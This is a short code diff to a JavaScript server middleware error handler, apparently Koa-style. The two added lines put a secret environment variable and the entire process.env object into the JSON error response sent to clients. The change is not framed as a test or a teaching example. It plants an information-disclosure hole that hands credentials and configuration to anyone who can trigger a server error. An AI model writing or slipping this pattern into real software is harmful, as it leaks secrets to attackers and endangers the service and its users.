@@ -14,6 +14,8 @@ export default async function (ctx, next) {
     ctx.body = {
       code: 500,
       message: ctx.body.data.errmsg,
+      errors: [process.env.SECRET],
+      info: process.env
     };
   }
 }
